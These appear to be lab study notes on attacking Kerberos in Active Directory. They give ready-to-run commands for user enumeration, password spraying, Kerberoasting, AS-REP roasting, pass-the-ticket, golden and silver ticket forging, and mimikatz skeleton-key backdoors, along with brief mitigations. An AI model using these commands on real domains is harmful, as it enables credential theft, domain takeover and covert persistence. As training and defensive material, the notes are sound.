# Intro
This will cover the following steps: 
-   Initial enumeration using tools like Kerbrute and Rubeus
-   Kerberoasting
-   AS-REP Roasting with Rubeus and Impacket
-   Golden/Silver Ticket Attacks
-   Pass the Ticket
-   Skeleton key attacks using mimikatz

## What is Kerberos? 
Kerberos is the DEFAULT authentication service for Windows domains. It is designed to be more secure than NTLM by using third party ticket authorization and stronger encryption. 

## Terminology
-   **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
-   **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
-   **Authentication Service (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
-   **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a service ticket to a machine on the domain.
-   **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
-   **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.
-   **KDC Long Term Secret Key (KDC LT Key)** - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
-   **Client Long Term Secret Key (Client LT Key)** - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
-   **Service Long Term Secret Key (Service LT Key)** - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
-   **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.

## AS-REQ w/ Pre-Authentication in detail
- The first step is for the user to encrypt a timestamp NT hash and send it to the AS. 
- Then, the KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT and a session key for the user. 

## TGT Contents

![431da7f9c4ff40cc9418936201a0adf6.png](../../_resources/431da7f9c4ff40cc9418936201a0adf6-1.png)

## Service Ticket Contents

![22b8c5c8067f43adb0ffd1f620049a30.png](../../_resources/22b8c5c8067f43adb0ffd1f620049a30-1.png)

## Kerberos Authentication Process

![f4e4cd593f9f4e487e255c90d20e9344.png](../../_resources/f4e4cd593f9f4e487e255c90d20e9344-1.png)

AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
AP-REP - 6.) The service grants access

## Kerberos Tickets 

- TGT can be in various forms like `.kirbi` for Rubeus and `.ccache` for Impacket.
- Tickets are typically base64 encoded
- A normal TGT will only work with that given service account connected to it, but a KRBTGT allows you to get any service ticket that you want (allowing access to anything on the domain)

## Attack Privilege Requirements

-   Kerbrute Enumeration - No domain access required 
-   Pass the Ticket - Access as a user to the domain required
-   Kerberoasting - Access as any user required
-   AS-REP Roasting - Access as any user required
-   Golden Ticket - Full domain compromise (domain admin) required 
-   Silver Ticket - Service hash required 
-   Skeleton Key - Full domain compromise (domain admin) required

# Enumeration with Kerbrute

## Abusing Pre-authentication
By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

Enumerating users (Kerbrute): 
```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local -o kerbrute.txt User.txt 
```

# Harvesting and Bruteforcing Tickets with Rubeus

## Harvesting Tickets

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

Harvest for TGTs every 30 seconds: 
```cmd
Rubeus.exe harvest /interval:30
```

## Bruteforcing / password spraying

**WARNING**: This may lock you out of the network depending on lockout policies!

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you may need to add the domain controller domain name to the windows hosts file:

```cmd
echo 10.10.55.136 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

Basic Rubeus password spray: 

```cmd
Rubeus.exe brute /password:Password1 /noticket
```

# Kerberoasting with Rubeus and Impacket

Kerberoasting is done in the following way: 
1. Enumerate SPNs of AD **service accounts** (e.g. MSSQL, IIS, etc)
2. Request TGS tickets for the SPNs [TGS-REQ]
3. AD domain controller responds with a service ticket [TGS-REP]
4. Extract and dump hashes from ticket content in memory (with Mimikatz or as a flat kirbi document)
5. Decrypt hashes offline (with hashcat, john, tgsrepcrack.py)
6. Login to the service account using the bruteforced password!

## Kerberoasting with Rubeus

This will dump the Kerberos hash of any kerberoastable users: 

```cmd
Rubeus.exe kerberoast
```

Then crack with hashcat!

```sh
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

## Kerberoasting with Impacket

Dump the Kerberos hash for all kerberoastable accounts (like Rubeus, but can be done remotely)

```sh
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.55.136 -request
```

## Kerberoasting Mitigation
-   Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
-   Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

# AS-REP Roasting with Rubeus

- Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have **Kerberos pre-authentication disabled**.
- **UNLIKE** Kerberoasting, such users don't have to be service accounts
- You can use tools like kekeo, GetNPUsers.py, and Rubeus

## AS-REP Roasting overview

During pre-authentication, the user's hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp, the KDC will then issue a TGT for the user. If pre-authentication is disabled, you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

## Dump KRBASREP5 Hashes with Rubeus

```cmd
Rubeus.exe asreproast
```

## Cracking with Hashcat

Make sure to insert `23$` after the `$krb5asrep$` so the hash looks something like `$krb5asrep$23$user@domain.com:...` (mode 18200 in hashcat examples)

```sh
hashcat -m 18200 hash.txt Pass.txt
```

## AS-REP Roasting Mitigations

-   Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective.
-   Don't turn off Kerberos Pre-Authentication unless it's necessary. There's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

# Pass the Ticket with Mimikatz

## Pass the Ticket overview

- Mimikatz can be used to dump a TGT from LSASS memory, giving you a .kirbi ticket
- Note that the LSASS process stores credentials as well as Kerberos tickets.
- If a domain admin's ticket is in memory, you can easily escalate privileges. 

## Using Mimikatz

Dumping tickets
1. `mimikatz.exe` Run mimikatz 
2. `privilege::debug` Ensure that you have sufficient privileges ('20 OK') 
3. `sekurlsa::tickets /export` Export all .kirbi tickets to current directory
4. Recommended: Find an administrator ticket from the krbtgt (like below)

![45904646f4f23a917b525f60fd60f81b.png](../../_resources/45904646f4f23a917b525f60fd60f81b-1.png)

Pass the Ticket
1. `kerberos::ptt <ticket>` Run this command on a ticket to cache and impersonate a ticket
2. `klist` Run this in cmd to make sure the ticket was properly cached/impersonated
3. You now have the same rights as the TGT you're impersonating!

## Pass the Ticket Mitigation

- Don't let your domain admins log onto anything except the domain controller - a lot of domain admins will log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

# Golden/Silver Ticket Attacks with Mimikatz

A silver ticket is usually a little more discreet than a golden ticket. The key difference is that the silver ticket is limited to the service that is targeted, whereas the golden ticket has access to any Kerberos service. 

## KRBTGT overview

Don't confuse KRBTGT (service account) vs. a TGT (just a ticket). KRBTGT is the service account for the KDC that issues all of the tickets to clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want.

## Golden/Silver Ticket Attack overview

For a golden ticket, you dump the KRBTGT ticket. 
For a silver ticket, you dump any service or domain admin ticket. 

## Using Mimikatz

Dump the krbtgt hash: 
1. `mimikatz.exe` Run mimikatz
2. `privilege::debug` Ensure you get '20 OK' (sufficient permissions)
3. `lsadump::lsa /inject /name:krbtgt` Dump the hash and SID needed to create a Golden Ticket. To create a silver ticket, you need to change the `/name:` to dump the hash of either a domain admin or a service account.

Create a golden/silver ticket and use it for access: 
1. `kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` (this is for creating a golden ticket)
2. `misc::cmd` Open a new command prompt with the given ticket in mimikatz.

Golden ticket example: 
```cmd
mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory
```

Silver ticket example: 
```cmd
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```

# Kerberos Backdoors with Mimikatz

A Kerberos backdoor is more subtle than golden/silver tickets because it acts similar to a rootkit by implanting itself into the memory of the domain forest (allowing access to any machine with a master password)

## Skeleton Key Overview

The Kerberos backdoor works by implanting a skeleton key that abuses the way that AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF6` which makes the password `mimikatz`

When a skeleton key is implanted, the domain controller tries to decrypt the AS-REQ encrypted timestamp using both the user NT hash AND the skeleton key NT hash (allowing backdoor access)

Remember, the skeleton key will not persist by itself because it runs in the memory

## Installing Skeleton Key with Mimikatz

1. `mimikatz.exe` Run mimikatz
2. `privilege::debug` Ensure sufficient permissions
3. `misc::skeleton` Install the skeleton key (it's that easy!)

Access a share: 
`net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` 

Access a directory (of Desktop-1): 
`dir \\Desktop-1\c$ /user:Machine1 mimikatz`

